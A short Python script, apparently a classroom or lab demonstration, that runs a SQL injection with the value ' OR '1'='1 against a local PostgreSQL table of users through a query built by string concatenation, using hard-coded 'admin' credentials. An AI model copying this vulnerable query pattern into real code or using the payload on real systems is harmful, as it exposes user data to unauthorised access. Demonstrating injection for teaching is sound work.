import psycopg2

conn = psycopg2.connect(
    host="127.0.0.1",
    port=5432,
    database="mobigreen_urban",
    user="admin",
    password="admin"
)

cursor = conn.cursor()

# Entrada maliciosa
nom = "' OR '1'='1"

# Consulta vulnerável (concatenação de strings)
query = f"SELECT * FROM usagers WHERE nom = '{nom}';"
print("Consulta executada:", query)

cursor.execute(query)
rows = cursor.fetchall()

print("Resultado da injeção SQL:")
for row in rows:
    print(row)

cursor.close()
conn.close()

